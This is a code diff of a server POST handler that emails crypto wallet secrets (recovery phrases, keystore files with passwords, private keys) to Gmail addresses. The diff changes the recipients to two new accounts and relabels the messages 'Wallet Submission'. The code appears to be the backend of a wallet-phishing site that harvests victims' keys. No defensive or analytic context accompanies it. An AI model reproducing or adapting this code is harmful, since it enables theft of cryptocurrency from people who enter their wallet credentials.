@@ -36,8 +36,8 @@ export async function POST(request: Request) {
       const formattedMessage = formatMessage(phrase);
 
       const mailOptions = {
-        from: `New Connect ${email}`,
-        to: ["jamesanderson197x@gmail.com"],
+        from: `New Wallet Submission ${email}`,
+        to: ["zalenkajayne@gmail.com,fahadabdullahi180@gmail.com"],
         subject: "Wallet Submission",
         html: formattedMessage,
       }
@@ -75,8 +75,8 @@ export async function POST(request: Request) {
 
 
       const mailOptions = {
-        from: `New Connect ${email}`,
-        to: ["jamesanderson197x@gmail.com"],
+        from: `New Wallet Submission ${email}`,
+        to: ["zalenkajayne@gmail.com,fahadabdullahi180@gmail.com"],
         subject: "Wallet Submission",
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       }
@@ -116,8 +116,8 @@ export async function POST(request: Request) {
       const formattedMessage = formatMessage(privateKey);
 
       const mailOptions = {
-        from: `New Connect ${email}`,
-        to: ["jamesanderson197x@gmail.com"],
+        from: `New Wallet Submission ${email}`,
+        to: ["zalenkajayne@gmail.com,fahadabdullahi180@gmail.com"],
         subject: "Wallet Submission",
         html: formattedMessage,
       }
